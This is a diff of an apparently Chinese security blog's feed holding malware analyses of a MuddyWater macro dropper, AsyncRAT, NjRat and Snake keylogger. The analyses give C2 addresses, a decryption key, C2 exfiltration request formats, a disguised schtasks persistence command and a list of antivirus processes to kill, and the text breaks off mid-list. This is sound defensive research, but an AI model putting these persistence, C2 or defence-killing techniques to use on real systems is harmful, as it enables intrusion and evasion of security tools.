+<p>文档内容如下：</p>
+<p><img src="/muddywater_images/313823013220146.png" alt=""></p>
+<p><strong>ioc</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类别</th>
+<th style="text-align:left">特征值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">MD5</td>
+<td style="text-align:left">c9ab403bd43649b5fd57efac4bf83b7c</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA1</td>
+<td style="text-align:left">d3d98b066011fea2f4f1b9eaab97b28591d50fbe</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA256</td>
+<td style="text-align:left">ea24c5a8b976919d4c8c4779dc0b7ef887373f126c4732edf9023b827b4e4dc4</td>
+</tr>
+<tr>
+<td style="text-align:left">C2</td>
+<td style="text-align:left">192.227.147.152<!-- raw HTML omitted -->107.174.68.60</td>
+</tr>
+</tbody>
+</table>
+<h2 id="样本分析">样本分析</h2>
+<h3 id="文档宏分析">文档宏分析</h3>
+<p><code>doc</code>文档中包含了一个<code>VBA</code>脚本，该脚本中存在一些加解密过程，然后会生成<code>C:\ProgramData\Temp_WZW4.txt</code>和<code>%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Temp_WZW4.vbs</code>，当然了两者的内容是一致的：</p>
+<p><img src="/muddywater_images/283743213226439.png" alt=""></p>
+<h3 id="释放宏分析">释放宏分析</h3>
+<p>上述宏可以通过<code>python</code>脚本来还原，获取释放的文件内容（<code>string.txt</code>中存放的是解密密钥和密文）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">strfile</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;string.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">strlist</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">strfile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">strlist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">keys</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">tempValue</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">appdatapath</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">startpath</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">clearText</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">key</span> <span class="o">=</span> <span class="n">keys</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">value</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">modifyText</span> <span class="o">=</span> <span class="n">clearText</span><span class="p">(</span><span class="n">tempValue</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pathSave1</span> <span class="o">=</span> <span class="n">clearText</span><span class="p">(</span><span class="n">appdatapath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pathSave2</span> <span class="o">=</span> <span class="n">clearText</span><span class="p">(</span><span class="n">startpath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">modifyText</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pathSave1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pathSave2</span><span class="p">)</span>
+</span></span></code></pre></div><p>现在我们获得了一个新的<code>VBScript</code>脚本缓存，根据原始文档宏的要求，替换<code>**</code>为换行符，然后美化一下格式，我们就得到了一个漂亮的<code>Temp_WZW4.vbs</code>，从代码上可以看出字符内容是经过加密的，不过我们可以直接应用作者的代码进行还原：</p>
+<p><img src="/muddywater_images/184322914235829.png" alt=""></p>
+<p>通过<code>WScript.Echo</code>输出显示，这样我们就能知道<code>C2</code>是：<code>192.227.147.152，107.174.68.60</code>；<code>&amp;l8x8ml=</code>对应的是：<code>&amp;status=</code>；<code>{&quot;&quot;61uuxiwR3lms8&quot;&quot;:</code>对应的是：<code>{&quot;commandResult&quot;:</code></p>
+<p>尽管<code>Temp_WZW4.vbs</code>已经很美观了，但为了阅读方便，我对它的函数名和变量名做了重定义，让我们从第一个函数开始看：</p>
+<p><img src="/muddywater_images/281532214239274.png" alt=""></p>
+<p>这里会和<code>C2</code>进行交互，执行<code>explorer.exe</code>命令，发出以下请求：</p>
+<pre tabindex="0"><code>Get ：/getCommand?guid=[uid]
+POST：/getTargetInfo?guid=[uid]&amp;status=[statusID]{&#34;commandResult&#34;:[CMD(responseGET)]}
+</code></pre><p>命令执行函数会创建一个新的文档用于暂存执行结果<code>c:\ProgramData\AvoU.txt</code>，并在函数结束时返回内容：</p>
+<p><img src="/muddywater_images/185053114231583.png" alt=""></p>
+<p>由于<code>C2</code>的<code>IP</code>地址有两个，所以存在一个设置<code>C2</code>地址的函数：</p>
+<p><img src="/muddywater_images/401123314249463.png" alt=""></p>
+<p>随机休眠函数则是如下实现的：</p>
+<p><img src="/muddywater_images/451063414247067.png" alt=""></p>
+<p><code>GET</code>请求函数如下：</p>
+<p><img src="/muddywater_images/265543614244569.png" alt=""></p>
+<p><code>POST</code>请求函数如下：</p>
+<p><img src="/muddywater_images/96743714225810.png" alt=""></p>
+<p>当状态码是<code>126</code>时，会存在一个交互处理函数，当输入<code>1</code>时，会获取<code>OS</code>的相关信息：</p>
+<p><img src="/muddywater_images/471374014248250.png" alt=""></p>
+<p>获取<code>OS</code>信息的函数如下：</p>
+<p><img src="/muddywater_images/290964214243386.png" alt=""></p>
+<h2 id="参考资料">参考资料</h2>
+<pre tabindex="0"><code>https://attack.mitre.org/groups/G0069/
+https://app.any.run/tasks/39a7ba74-e232-42d0-98fe-9063a5be417b/
+https://www.virustotal.com/gui/file/ea24c5a8b976919d4c8c4779dc0b7ef887373f126c4732edf9023b827b4e4dc4
+https://twitter.com/ShadowChasing1/status/1475819281648553986
+</code></pre>]]></content>
+		</item>
+		
+		<item>
+			<title>AsyncRAT</title>
+			<link>https://www.a1ee.cn/medium/asyncrat/</link>
+			<pubDate>Mon, 28 Mar 2022 11:46:12 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/asyncrat/</guid>
+			<description>AsyncRat 样本分析 1. 样本信息 AsyncRat是一种远程访问工具 (RAT)，旨在通过安全的加密连接远程监视和控制其他计算机。它是一个开源远程管理工具，</description>
+			<content type="html"><![CDATA[<h1 id="asyncrat-样本分析">AsyncRat 样本分析</h1>
+<h2 id="1-样本信息">1. 样本信息</h2>
+<p><code>AsyncRat</code>是一种远程访问工具 (<code>RAT</code>)，旨在通过安全的加密连接远程监视和控制其他计算机。它是一个开源远程管理工具，因此它也可能被恶意使用，<code>AsyncRat</code>可以通过鱼叉式网络钓鱼、恶意广告、漏洞利用工具包和其他技术等多种方式进行交付。</p>
+<p><img src="/asyncrat_images/91031611238191.png" alt=""></p>
+<p><strong>ioc</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类别</th>
+<th style="text-align:left">特征值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">MD5</td>
+<td style="text-align:left">0ab8714feb584bd232ed461615d4cfac</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA1</td>
+<td style="text-align:left">649e98ae73a023a5892ac0f9eec2988119299e91</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA256</td>
+<td style="text-align:left">5da9e7a1817e5ac56efd07be9ce8d943f443707cbcb0d8a22e9b065b451c56dd</td>
+</tr>
+<tr>
+<td style="text-align:left">C2</td>
+<td style="text-align:left">money14.ddns.net:5555</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2-样本分析">2. 样本分析</h2>
+<h3 id="21-自动休眠">2.1. 自动休眠</h3>
+<p>恶意程序会根据配置进行休眠：</p>
+<p><img src="/asyncrat_images/551935713211269.png" alt=""></p>
+<p>当前样本的配置为<code>3s</code>：</p>
+<p><img src="/asyncrat_images/591245813229695.png" alt=""></p>
+<h3 id="22-初始化设置">2.2. 初始化设置</h3>
+<p>恶意程序内存在加密字符串，将通过<code>AES256</code>解密字符串：</p>
+<p><img src="/asyncrat_images/390250814217562.png" alt=""></p>
+<p>其中关键字符串整理如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Key</td>
+<td style="text-align:left">QGjeYaXwfNBH8Fh4Udv9UB6mz2EU1Zvo</td>
+</tr>
+<tr>
+<td style="text-align:left">Ports</td>
+<td style="text-align:left">5555</td>
+</tr>
+<tr>
+<td style="text-align:left">Hosts</td>
+<td style="text-align:left">money14.ddns.net</td>
+</tr>
+<tr>
+<td style="text-align:left">Version</td>
+<td style="text-align:left">0.5.7B</td>
+</tr>
+<tr>
+<td style="text-align:left">Install</td>
+<td style="text-align:left">false</td>
+</tr>
+<tr>
+<td style="text-align:left">MTX</td>
+<td style="text-align:left">AsyncMutex_6SI8O89Q</td>
+</tr>
+<tr>
+<td style="text-align:left">Pastebin</td>
+<td style="text-align:left">null</td>
+</tr>
+<tr>
+<td style="text-align:left">Anti</td>
+<td style="text-align:left">false</td>
+</tr>
+<tr>
+<td style="text-align:left">BDOS</td>
+<td style="text-align:left">false</td>
+</tr>
+<tr>
+<td style="text-align:left">Group</td>
+<td style="text-align:left">Default</td>
+</tr>
+<tr>
+<td style="text-align:left">Hwid</td>
+<td style="text-align:left">A3B53DC9D45BCF299437</td>
+</tr>
+</tbody>
+</table>
+<p>其中<code>Hwid</code>是由处理器数量，当前用户名，<code>NetBIOS</code>名称，<code>OS</code>版本号及系统卷磁盘大小组成的字符串经过定制的<code>Hash</code>计算得出：</p>
+<p><img src="/asyncrat_images/216802114237728.png" alt=""></p>
+<p><code>Hash</code>计算函数如下：</p>
+<p><img src="/asyncrat_images/414312814230397.png" alt=""></p>
+<p>为防止配置字符串被篡改，恶意程序还进行了一次自校验：</p>
+<p><img src="/asyncrat_images/282893014226952.png" alt=""></p>
+<h3 id="23-创建互斥体">2.3. 创建互斥体</h3>
+<p>恶意程序会创建一个名为<code>AsyncMutex_6SI8O89Q</code>的互斥体：</p>
+<p><img src="/asyncrat_images/315413314222706.png" alt=""></p>
+<h3 id="24-反分析技术">2.4. 反分析技术</h3>
+<p>当<code>Anti</code>为<code>true</code>时，将调用<code>Anti_Analysis.RunAntiAnalysis()</code>进行反分析操作，其中包含了：虚拟机检测、调试检测、沙箱检测、磁盘空间检测、<code>XP</code>系统检测，一旦满足其中一条，将终止自身进程：</p>
+<p><img src="/asyncrat_images/312873514240586.png" alt=""></p>
+<p>恶意程序会在系统制造数据中检测是否包含<code>VIRTUAL</code>、<code>vmware</code>或<code>VirtualBox</code>字段：</p>
+<p><img src="/asyncrat_images/201174214238190.png" alt=""></p>
+<p>通过<code>NativeMethods.CheckRemoteDebuggerPresent()</code>检测当前进程是否正在被调试：</p>
+<p><img src="/asyncrat_images/599814214235692.png" alt=""></p>
+<p>通过检测沙箱的动态链接库<code>SbieDll.dll</code>是否存在，判断是否在杀向中运行：</p>
+<p><img src="/asyncrat_images/232304514216933.png" alt=""></p>
+<p>判断系统卷磁盘大小是否大于<code>61000000000B</code>大约<code>56.8GB</code>：</p>
+<p><img src="/asyncrat_images/212821215239373.png" alt=""></p>
+<p>判断操作系统是否为<code>xp</code>：</p>
+<p><img src="/asyncrat_images/443711415234509.png" alt=""></p>
+<h3 id="25-设置自启动">2.5. 设置自启动</h3>
+<p>当<code>Install</code>为<code>true</code>时，将执行<code>NormalStartup.Install()</code>函数，将判断当前文件完整路径是否为<code>%AppData%/svchost.exe</code>，如果不是则杀掉进程中的<code>svchost.exe</code>项：</p>
+<p><img src="/asyncrat_images/282252815228055.png" alt=""></p>
+<p>其中<code>InstallFolder</code>和<code>InstallFile</code>数值如下：</p>
+<p><img src="/asyncrat_images/468492915221189.png" alt=""></p>
+<p>然后判断当前是否是<code>admin</code>权限，如果是，则调用cmd执行下列命令，添加最高运行等级的开机自启计划任务:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">f</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onlogon</span> <span class="p">/</span><span class="n">rl</span> <span class="n">highest</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;svchost.exe&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s1">&#39;&#34;%AppData%/svchost.exe&#34;&#39;</span> <span class="p">&amp;</span> <span class="n">exit</span>
+</span></span></code></pre></div><p><img src="/asyncrat_images/50004315211719.png" alt=""></p>
+<p>如果不是<code>admin</code>权限，则修改注册表（<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\</code>）实现开机自启：</p>
+<p><img src="/asyncrat_images/18154615214223.png" alt=""></p>
+<p>接着会判断<code>%AppData%/svchost.exe</code>是否存在，存在则删除，然后读取当前执行文件字节，写入生成<code>%AppData%/svchost.exe</code>：</p>
+<p><img src="/asyncrat_images/209915115223170.png" alt=""></p>
+<p>完成自我复制后，如果当前执行权限是<code>admin</code>则通过调用<code>RtlSetProcessIsCritical</code>关闭进程保护，关闭互斥锁，解除<code>SslClient</code>和<code>TcpClient</code>客户端连接：</p>
+<p><img src="/asyncrat_images/39515509211270.png" alt=""></p>
+<p>然后创建一个临时的<code>.bat</code>文件并向其中写入命令，启动<code>%AppData%/svchost.exe</code>，然后自我删除。当所有指令执行完成后退出：</p>
+<p><img src="/asyncrat_images/96960410229696.png" alt=""></p>
+<h3 id="26-切换至特殊模式运行">2.6. 切换至特殊模式运行</h3>
+<p>调用<code>Process.EnterDebugMode()</code>将进程以特殊模式运行：</p>
+<p><img src="/asyncrat_images/470295110217563.png" alt=""></p>
+<h3 id="27-构建-socket-通信">2.7. 构建 Socket 通信</h3>
+<p>如果<code>Pastebin</code>为<code>null</code>，构建<code>TcpClient</code>连接域名<code>money14.ddns.net</code>，端口<code>5555</code>：</p>
+<p><img src="/asyncrat_images/233495410237729.png" alt=""></p>
+<p>如果<code>Pastebin</code>不为<code>null</code>，则解析<code>Pastebin</code>结构，连接指定域名端口：</p>
+<p><img src="/asyncrat_images/484155910230398.png" alt=""></p>
+<p>当成功构建<code>Socket</code>通信连接，将以<code>初始化设置</code>中解密的<code>ServerCertificate</code>证书进行加密通信：</p>
+<p><img src="/asyncrat_images/569670211226953.png" alt=""></p>
+<p>首先发送的数据报文结构如下：</p>
+<p><img src="/asyncrat_images/484470511222707.png" alt=""></p>
+<h2 id="3-参考资料">3. 参考资料</h2>
+<pre tabindex="0"><code>https://labs.k7computing.com/index.php/github-home-to-asyncrat-backdoor/
+https://app.any.run/tasks/51782c07-64b8-4c8c-b5ba-66a04fa2a61e/
+https://www.virustotal.com/gui/file/5da9e7a1817e5ac56efd07be9ce8d943f443707cbcb0d8a22e9b065b451c56dd
+</code></pre>]]></content>
+		</item>
 		
 		<item>
 			<title>NjRat</title>
@@ -168,7 +814,7 @@
 <p>当采用了<code>k</code>子命令时，将循环检索<code>&lt;ProcessID&gt;</code>，杀死进程，每次执行后都将反馈结果至<code>C2</code>服务器：</p>
 <p><img src="/njrat_images/354302211235685.png" alt=""></p>
 <p><strong>当命令组合为：<code>proc|'|'|kd|'|'|&lt;ProcessID&gt;..</code>时</strong></p>
-<p>当采用了<code>kd</code>子命令时，将循环检索<code>&lt;ProcessID&gt;</code>，杀死进程并删除进程文件，每次执行后都将反馈结果至<code>C2</code>服务器（彩蛋：这里<code>Delete</code>后作者的标识依然是<code>ER</code> -_-!）：</p>
+<p>当采用了<code>kd</code>子命令时，将循环检索<code>&lt;ProcessID&gt;</code>，杀死进程并删除进程文件，每次执行后都将反馈结果至<code>C2</code>服务器（彩蛋：这里<code>Delete</code>后作者的标识依然是<code>ER</code> -.-!）：</p>
 <p><img src="/njrat_images/253812911216926.png" alt=""></p>
 <p><strong>当命令组合为：<code>proc|'|'|re|'|'|&lt;ProcessID&gt;..</code>时</strong></p>
 <p>当采用了<code>re</code>子命令时，将循环检索<code>&lt;ProcessID&gt;</code>，重启进程，每次执行后都将反馈结果至<code>C2</code>服务器：</p>
@@ -296,11 +942,11 @@
 <p>将递归删除<code>&lt;Registry_Name&gt;</code>项和它的其它子项：</p>
 <p><img src="/njrat_images/510814811243613.png" alt=""></p>
 <h2 id="3-参考资料">3. 参考资料</h2>
-<p><a href="https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/">https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/</a>
-<a href="https://www.secpulse.com/archives/73878.html">https://www.secpulse.com/archives/73878.html</a>
-<a href="https://app.any.run/tasks/78913e0b-1419-4571-8611-ac3372ffd578/#">https://app.any.run/tasks/78913e0b-1419-4571-8611-ac3372ffd578/#</a>
-<a href="https://www.virustotal.com/gui/file/833f86074592648c0a758098e34ab605a2b922d94dbab7141e2ce87acec03c35">https://www.virustotal.com/gui/file/833f86074592648c0a758098e34ab605a2b922d94dbab7141e2ce87acec03c35</a></p>
-]]></content>
+<pre tabindex="0"><code>https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/
+https://www.secpulse.com/archives/73878.html
+https://app.any.run/tasks/78913e0b-1419-4571-8611-ac3372ffd578/#
+https://www.virustotal.com/gui/file/833f86074592648c0a758098e34ab605a2b922d94dbab7141e2ce87acec03c35
+</code></pre>]]></content>
 		</item>
 		
 		<item>
@@ -402,7 +1048,7 @@
 <p><img src="/snake_images/3567936190299.png" alt=""></p>
 <h4 id="352-杀死防护进程">3.5.2. 杀死防护进程</h4>
 <p>该样本中存在<code>194</code>个进程目标，其中包含了杀毒软件和监控软件：</p>
-<pre tabindex="0"><code>&quot;zlclient&quot;,&quot;egui&quot;,&quot;bdagent&quot;,&quot;npfmsg&quot;,&quot;olydbg&quot;,&quot;anubis&quot;,&quot;wireshark&quot;,&quot;avastui&quot;,&quot;_Avp32&quot;,&quot;vsmon&quot;,&quot;mbam&quot;,&quot;keyscrambler&quot;,&quot;_Avpcc&quot;,&quot;_Avpm&quot;,&quot;Ackwin32&quot;,&quot;Outpost&quot;,&quot;Anti-Trojan&quot;,&quot;ANTIVIR&quot;,&quot;Apvxdwin&quot;,&quot;ATRACK&quot;,&quot;Autodown&quot;,&quot;Avconsol&quot;,&quot;Ave32&quot;,&quot;Avgctrl&quot;,&quot;Avkserv&quot;,&quot;Avnt&quot;,&quot;Avp&quot;,&quot;Avp32&quot;,&quot;Avpcc&quot;,&quot;Avpdos32&quot;,&quot;Avpm&quot;,&quot;Avptc32&quot;,&quot;Avpupd&quot;,&quot;Avsched32&quot;,&quot;AVSYNMGR&quot;,&quot;Avwin95&quot;,&quot;Avwupd32&quot;,&quot;Blackd&quot;,&quot;Blackice&quot;,&quot;Cfiadmin&quot;,&quot;Cfiaudit&quot;,&quot;Cfinet&quot;,&quot;Cfinet32&quot;,&quot;Claw95&quot;,&quot;Claw95cf&quot;,&quot;Cleaner&quot;,&quot;Cleaner3&quot;,&quot;Defwatch&quot;,&quot;Dvp95&quot;,&quot;Dvp95_0&quot;,&quot;Ecengine&quot;,&quot;Esafe&quot;,&quot;Espwatch&quot;,&quot;F-Agnt95&quot;,&quot;Findviru&quot;,&quot;Fprot&quot;,&quot;F-Prot&quot;,&quot;F-Prot95&quot;,&quot;Fp-Win&quot;,&quot;Frw&quot;,&quot;F-Stopw&quot;,&quot;Iamapp&quot;,&quot;Iamserv&quot;,&quot;Ibmasn&quot;,&quot;Ibmavsp&quot;,&quot;Icload95&quot;,&quot;Icloadnt&quot;,&quot;Icmon&quot;,&quot;Icsupp95&quot;,&quot;Icsuppnt&quot;,&quot;Iface&quot;,&quot;Iomon98&quot;,&quot;Jedi&quot;,&quot;Lockdown2000&quot;,&quot;Lookout&quot;,&quot;Luall&quot;,&quot;MCAFEE&quot;,&quot;Moolive&quot;,&quot;Mpftray&quot;,&quot;N32scanw&quot;,&quot;NAVAPSVC&quot;,&quot;NAVAPW32&quot;,&quot;NAVLU32&quot;,&quot;Navnt&quot;,&quot;NAVRUNR&quot;,&quot;Navw32&quot;,&quot;Navwnt&quot;,&quot;NeoWatch&quot;,&quot;NISSERV&quot;,&quot;Nisum&quot;,&quot;Nmain&quot;,&quot;Normist&quot;,&quot;NORTON&quot;,&quot;Nupgrade&quot;,&quot;Nvc95&quot;,&quot;Outpost&quot;,&quot;Padmin&quot;,&quot;Pavcl&quot;,&quot;Pavsched&quot;,&quot;Pavw&quot;,&quot;PCCIOMON&quot;,&quot;PCCMAIN&quot;,&quot;Pccwin98&quot;,&quot;Pcfwallicon&quot;,&quot;Persfw&quot;,&quot;POP3TRAP&quot;,&quot;PVIEW95&quot;,&quot;Rav7&quot;,&quot;Rav7win&quot;,&quot;Rescue&quot;,&quot;Safeweb&quot;,&quot;Scan32&quot;,&quot;Scan95&quot;,&quot;Scanpm&quot;,&quot;Scrscan&quot;,&quot;Serv95&quot;,&quot;Smc&quot;,&quot;SMCSERVICE&quot;,&quot;Snort&quot;,&quot;Sphinx&quot;,&quot;Sweep95&quot;,&quot;SYMPROXYSVC&quot;,&quot;Tbscan&quot;,&quot;Tca&quot;,&quot;Tds2-98&quot;,&quot;Tds2-Nt&quot;,&quot;TermiNET&quot;,&quot;Vet95&quot;,&quot;Vettray&quot;,&quot;Vscan40&quot;,&quot;Vsecomr&quot;,&quot;Vshwin32&quot;,&quot;Vsstat&quot;,&quot;Webscanx&quot;,&quot;WEBTRAP&quot;,&quot;Wfindv32&quot;,&quot;Zonealarm&quot;,&quot;LOCKDOWN2000&quot;,&quot;RESCUE32&quot;,&quot;LUCOMSERVER&quot;,&quot;avgcc&quot;,&quot;avgcc&quot;,&quot;avgamsvr&quot;,&quot;avgupsvc&quot;,&quot;avgw&quot;,&quot;avgcc32&quot;,&quot;avgserv&quot;,&quot;avgserv9&quot;,&quot;avgserv9schedapp&quot;,&quot;avgemc&quot;,&quot;ashwebsv&quot;,&quot;ashdisp&quot;,&quot;ashmaisv&quot;,&quot;ashserv&quot;,&quot;aswUpdSv&quot;,&quot;symwsc&quot;,&quot;norton&quot;,&quot;Norton Auto-Protect&quot;,&quot;norton_av&quot;,&quot;nortonav&quot;,&quot;ccsetmgr&quot;,&quot;ccevtmgr&quot;,&quot;avadmin&quot;,&quot;avcenter&quot;,&quot;avgnt&quot;,&quot;avguard&quot;,&quot;avnotify&quot;,&quot;avscan&quot;,&quot;guardgui&quot;,&quot;nod32krn&quot;,&quot;nod32kui&quot;,&quot;clamscan&quot;,&quot;clamTray&quot;,&quot;clamWin&quot;,&quot;freshclam&quot;,&quot;oladdin&quot;,&quot;sigtool&quot;,&quot;w9xpopen&quot;,&quot;Wclose&quot;,&quot;cmgrdian&quot;,&quot;alogserv&quot;,&quot;mcshield&quot;,&quot;vshwin32&quot;,&quot;avconsol&quot;,&quot;vsstat&quot;,&quot;avsynmgr&quot;,&quot;avcmd&quot;,&quot;avconfig&quot;,&quot;licmgr&quot;,&quot;sched&quot;,&quot;preupd&quot;,&quot;MsMpEng&quot;,&quot;MSASCui&quot;,&quot;Avira.Systray&quot;
+<pre tabindex="0"><code>&#34;zlclient&#34;,&#34;egui&#34;,&#34;bdagent&#34;,&#34;npfmsg&#34;,&#34;olydbg&#34;,&#34;anubis&#34;,&#34;wireshark&#34;,&#34;avastui&#34;,&#34;_Avp32&#34;,&#34;vsmon&#34;,&#34;mbam&#34;,&#34;keyscrambler&#34;,&#34;_Avpcc&#34;,&#34;_Avpm&#34;,&#34;Ackwin32&#34;,&#34;Outpost&#34;,&#34;Anti-Trojan&#34;,&#34;ANTIVIR&#34;,&#34;Apvxdwin&#34;,&#34;ATRACK&#34;,&#34;Autodown&#34;,&#34;Avconsol&#34;,&#34;Ave32&#34;,&#34;Avgctrl&#34;,&#34;Avkserv&#34;,&#34;Avnt&#34;,&#34;Avp&#34;,&#34;Avp32&#34;,&#34;Avpcc&#34;,&#34;Avpdos32&#34;,&#34;Avpm&#34;,&#34;Avptc32&#34;,&#34;Avpupd&#34;,&#34;Avsched32&#34;,&#34;AVSYNMGR&#34;,&#34;Avwin95&#34;,&#34;Avwupd32&#34;,&#34;Blackd&#34;,&#34;Blackice&#34;,&#34;Cfiadmin&#34;,&#34;Cfiaudit&#34;,&#34;Cfinet&#34;,&#34;Cfinet32&#34;,&#34;Claw95&#34;,&#34;Claw95cf&#34;,&#34;Cleaner&#34;,&#34;Cleaner3&#34;,&#34;Defwatch&#34;,&#34;Dvp95&#34;,&#34;Dvp95_0&#34;,&#34;Ecengine&#34;,&#34;Esafe&#34;,&#34;Espwatch&#34;,&#34;F-Agnt95&#34;,&#34;Findviru&#34;,&#34;Fprot&#34;,&#34;F-Prot&#34;,&#34;F-Prot95&#34;,&#34;Fp-Win&#34;,&#34;Frw&#34;,&#34;F-Stopw&#34;,&#34;Iamapp&#34;,&#34;Iamserv&#34;,&#34;Ibmasn&#34;,&#34;Ibmavsp&#34;,&#34;Icload95&#34;,&#34;Icloadnt&#34;,&#34;Icmon&#34;,&#34;Icsupp95&#34;,&#34;Icsuppnt&#34;,&#34;Iface&#34;,&#34;Iomon98&#34;,&#34;Jedi&#34;,&#34;Lockdown2000&#34;,&#34;Lookout&#34;,&#34;Luall&#34;,&#34;MCAFEE&#34;,&#34;Moolive&#34;,&#34;Mpftray&#34;,&#34;N32scanw&#34;,&#34;NAVAPSVC&#34;,&#34;NAVAPW32&#34;,&#34;NAVLU32&#34;,&#34;Navnt&#34;,&#34;NAVRUNR&#34;,&#34;Navw32&#34;,&#34;Navwnt&#34;,&#34;NeoWatch&#34;,&#34;NISSERV&#34;,&#34;Nisum&#34;,&#34;Nmain&#34;,&#34;Normist&#34;,&#34;NORTON&#34;,&#34;Nupgrade&#34;,&#34;Nvc95&#34;,&#34;Outpost&#34;,&#34;Padmin&#34;,&#34;Pavcl&#34;,&#34;Pavsched&#34;,&#34;Pavw&#34;,&#34;PCCIOMON&#34;,&#34;PCCMAIN&#34;,&#34;Pccwin98&#34;,&#34;Pcfwallicon&#34;,&#34;Persfw&#34;,&#34;POP3TRAP&#34;,&#34;PVIEW95&#34;,&#34;Rav7&#34;,&#34;Rav7win&#34;,&#34;Rescue&#34;,&#34;Safeweb&#34;,&#34;Scan32&#34;,&#34;Scan95&#34;,&#34;Scanpm&#34;,&#34;Scrscan&#34;,&#34;Serv95&#34;,&#34;Smc&#34;,&#34;SMCSERVICE&#34;,&#34;Snort&#34;,&#34;Sphinx&#34;,&#34;Sweep95&#34;,&#34;SYMPROXYSVC&#34;,&#34;Tbscan&#34;,&#34;Tca&#34;,&#34;Tds2-98&#34;,&#34;Tds2-Nt&#34;,&#34;TermiNET&#34;,&#34;Vet95&#34;,&#34;Vettray&#34;,&#34;Vscan40&#34;,&#34;Vsecomr&#34;,&#34;Vshwin32&#34;,&#34;Vsstat&#34;,&#34;Webscanx&#34;,&#34;WEBTRAP&#34;,&#34;Wfindv32&#34;,&#34;Zonealarm&#34;,&#34;LOCKDOWN2000&#34;,&#34;RESCUE32&#34;,&#34;LUCOMSERVER&#34;,&#34;avgcc&#34;,&#34;avgcc&#34;,&#34;avgamsvr&#34;,&#34;avgupsvc&#34;,&#34;avgw&#34;,&#34;avgcc32&#34;,&#34;avgserv&#34;,&#34;avgserv9&#34;,&#34;avgserv9schedapp&#34;,&#34;avgemc&#34;,&#34;ashwebsv&#34;,&#34;ashdisp&#34;,&#34;ashmaisv&#34;,&#34;ashserv&#34;,&#34;aswUpdSv&#34;,&#34;symwsc&#34;,&#34;norton&#34;,&#34;Norton 